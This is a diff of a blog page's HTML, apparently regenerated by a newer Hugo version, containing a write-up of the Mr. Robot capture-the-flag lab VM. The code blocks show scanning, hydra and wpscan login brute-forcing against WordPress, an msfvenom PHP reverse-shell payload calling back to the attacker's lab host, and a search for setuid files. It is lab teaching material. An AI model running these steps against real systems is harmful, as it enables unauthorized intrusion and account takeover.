@@ -38,7 +38,8 @@
   
   
 
-  <link href="" rel="alternate" type="application/rss+xml" title="camelinc" />
+  
+
   <link href="http://camelinc.info//css/bootstrap.min.css" rel="stylesheet">
   <link href="http://camelinc.info//css/hc.css" rel="stylesheet">
 
@@ -50,7 +51,7 @@
   
   <link rel="stylesheet" href="http://camelinc.info//lightbox/css/lightbox.css" type="text/css" media="screen">
 
-  <meta name="generator" content="Hugo 0.18.1" />
+  <meta name="generator" content="Hugo 0.37.1" />
   <link href="//maxcdn.bootstrapcdn.com/font-awesome/4.5.0/css/font-awesome.min.css" rel="stylesheet">
   
   
@@ -154,9 +155,7 @@
 <p>There it is, waiting at 10.0.2.7.
 The next step obviously is to run a quick nmap scan.</p>
 
-<div class="highlight"><pre><code class="language-bash" data-lang="bash"><span></span>nmap -sS -p- <span class="m">10</span>.0.2.7 -v --open -oA target_<span class="k">$(</span>date <span class="s2">&quot;+%Y-%m-%d&quot;</span><span class="k">)</span> -sC -sV
-</code></pre></div>
-
+<div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash">nmap -sS -p- <span class="m">10</span>.0.2.7 -v --open -oA target_<span class="k">$(</span>date <span class="s2">&#34;+%Y-%m-%d&#34;</span><span class="k">)</span> -sC -sV</code></pre></div>
 
 
 
@@ -170,9 +169,7 @@ The next step obviously is to run a quick nmap scan.</p>
 
 <p>Run a file brute-force on the webserver.</p>
 
-<div class="highlight"><pre><code class="language-bash" data-lang="bash"><span></span>gobuster -u http://10.0.2.7 -w /usr/share/seclists/Discovery/Web_Content/raft-medium-files.txt -e -r -l
-</code></pre></div>
-
+<div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash">gobuster -u http://10.0.2.7 -w /usr/share/seclists/Discovery/Web_Content/raft-medium-files.txt -e -r -l</code></pre></div>
 
 
 
@@ -186,11 +183,9 @@ The next step obviously is to run a quick nmap scan.</p>
 
 <p>While gobuster is running and the results are coming in, let&rsquo;s just take a look at the website and the robots.txt.</p>
 
-<div class="highlight"><pre><code class="language-bash" data-lang="bash"><span></span>User-agent: *
+<div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash">User-agent: *
 fsocity.dic
-key-1-of-3.txt
-</code></pre></div>
-
+key-1-of-3.txt</code></pre></div>
 
 <p>Voila, there is the first key.</p>
 
@@ -208,9 +203,7 @@ key-1-of-3.txt
 
 <p>Next, we run wpscan examine the wordpress installation.</p>
 
-<div class="highlight"><pre><code class="language-bash" data-lang="bash"><span></span>wpscan --enumerate --threads <span class="m">20</span> --batch --log --url http://10.0.2.7
-</code></pre></div>
-
+<div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash">wpscan --enumerate --threads <span class="m">20</span> --batch --log --url http://10.0.2.7</code></pre></div>
 
 <p>Unfortunately, wpscan did not yield any obvious pointers to exploit the wordpress installation.
 Furthermore, the tool was not able enumerate any users that might have a valid login.</p>
@@ -218,12 +211,10 @@ Furthermore, the tool was not able enumerate any users that might have a valid l
 <p>Let&rsquo;s take another look at the discoveries so far.
 The fsocity.dic file might provide some pointers or provide input for a brute-force attack.</p>
 
-<div class="highlight"><pre><code class="language-bash" data-lang="bash"><span></span><span class="c1"># wc -l fsocity.dic</span>
-<span class="m">858160</span> fsocity.dic
-<span class="c1"># sort -u fsocity.dic | wc -l</span>
-<span class="m">11451</span>
-</code></pre></div>
-
+<div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash"><span class="c1"># wc -l fsocity.dic
+</span><span class="c1"></span><span class="m">858160</span> fsocity.dic
+<span class="c1"># sort -u fsocity.dic | wc -l
+</span><span class="c1"></span><span class="m">11451</span></code></pre></div>
 
 <p>Refreshing my knowledge about wordpress, the problem with username disclosure at the login seemed to provide a starting point.</p>
 
@@ -240,9 +231,7 @@ The fsocity.dic file might provide some pointers or provide input for a brute-fo
 <p>With the fsocity.dic and hydra we might be able to brute-force a valid login name.
 To do this, we simply set the password to some bogus value and adjust the pattern for an invalid login to &ldquo;Invalid username&rdquo;.</p>
 
-<p><div class="highlight"><pre><code class="language-bash" data-lang="bash"><span></span>hydra -L fsocity_sorted.dic -p <span class="nb">test</span> <span class="m">10</span>.0.2.7 http-post-form <span class="s2">&quot;/wp-login.php:log=^USER^&amp;pwd=^PASS^&amp;wp-submit=Log+In&amp;redirect_to=http%3A%2F%2F10.0.2.7%2Fwp-admin%2F&amp;testcookie=1:Invalid username&quot;</span> -t <span class="m">50</span> -f -V
-</code></pre></div>
-
+<p><div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash">hydra -L fsocity_sorted.dic -p <span class="nb">test</span> <span class="m">10</span>.0.2.7 http-post-form <span class="s2">&#34;/wp-login.php:log=^USER^&amp;pwd=^PASS^&amp;wp-submit=Log+In&amp;redirect_to=http%3A%2F%2F10.0.2.7%2Fwp-admin%2F&amp;testcookie=1:Invalid username&#34;</span> -t <span class="m">50</span> -f -V</code></pre></div>
 
 
 <figure class="fcenter">
@@ -257,9 +246,7 @@ To do this, we simply set the password to some bogus value and adjust the patter
 With a valid login name the next step is to brute-force the password for the user &ldquo;elliot&rdquo;.
 Let&rsquo;s switch back to wpscan for this task.</p>
 
-<div class="highlight"><pre><code class="language-bash" data-lang="bash"><span></span>wpscan --log --batch --url <span class="m">10</span>.0.2.7 --wordlist <span class="si">${</span><span class="nv">PWD</span><span class="si">}</span>/fsocity_sorted.dic --username elliot --threads <span class="m">20</span>
-</code></pre></div>
-
+<div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash">wpscan --log --batch --url <span class="m">10</span>.0.2.7 --wordlist <span class="si">${</span><span class="nv">PWD</span><span class="si">}</span>/fsocity_sorted.dic --username elliot --threads <span class="m">20</span></code></pre></div>
 
 
 
@@ -277,9 +264,7 @@ This can easily be done by adding our own php code to one of the templates.</p>
 
 <p>First, let&rsquo;s create a metasploit payload that connects back to us.</p>
 
-<div class="highlight"><pre><code class="language-bash" data-lang="bash"><span></span>msfvenom -p php/meterpreter/reverse_tcp <span class="nv">LHOST</span><span class="o">=</span><span class="m">10</span>.0.2.8 <span class="nv">LPORT</span><span class="o">=</span><span class="m">4444</span> -f raw -o meterpreter.php
-</code></pre></div>
-
+<div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash">msfvenom -p php/meterpreter/reverse_tcp <span class="nv">LHOST</span><span class="o">=</span><span class="m">10</span>.0.2.8 <span class="nv">LPORT</span><span class="o">=</span><span class="m">4444</span> -f raw -o meterpreter.php</code></pre></div>
 
 <p>After the reverse meterpreter session has been established, let&rsquo;s take a look at the home directories.
 There is a user robot with the second flag file.
@@ -297,16 +282,12 @@ Unfortunately, we do not have the right access rights, but in the same folder is
 
 <p>A quick search on google yields the result for the MD5 hash.</p>
 
-<div class="highlight"><pre><code class="language-text" data-lang="text"><span></span>MD5(abcdefghijklmnopqrstuvwxyz) = c3fcd3d76192e4007dfb496cca67e13b
-</code></pre></div>
-
+<div class="highlight"><pre class="chroma"><code class="language-text" data-lang="text">MD5(abcdefghijklmnopqrstuvwxyz) = c3fcd3d76192e4007dfb496cca67e13b</code></pre></div>
 
 <p>To get a proper shell, let&rsquo;s switch back to the meterpreter session and open a shell.
 An interactive version can be started via the following command.</p>
 
-<div class="highlight"><pre><code class="language-bash" data-lang="bash"><span></span>python -c <span class="s1">&#39;import pty; pty.spawn(&quot;/bin/bash&quot;)&#39;</span>
-</code></pre></div>
-
+<div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash">python -c <span class="s1">&#39;import pty; pty.spawn(&#34;/bin/bash&#34;)&#39;</span></code></pre></div>
 
 <p>Then we simply login with the robot user and the discovered password.
 This give access to the key file.</p>
@@ -368,9 +349,7 @@ The netfilter_priv_esc_ipv4 is not compatible with the old linux version.</p>
 <p>So there has to be some way to gain root on the server.
 Let&rsquo;s search for setuid files that might be exploitable.</p>
 
-<p><div class="highlight"><pre><code class="language-bash" data-lang="bash"><span></span>find / -perm +6000 <span class="m">2</span>&gt; /dev/null
-</code></pre></div>
-
+<p><div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash">find / -perm +6000 <span class="m">2</span>&gt; /dev/null</code></pre></div>
 
 
 <figure class="fcenter">
@@ -424,7 +403,7 @@ This version of nmap has that option enabled.</p>
 
 <footer>
 
-  <p class="text-muted credit">&copy; 2017. All rights reserved. </p>
+  <p class="text-muted credit">&copy; 2018. All rights reserved. </p>
 
   
   
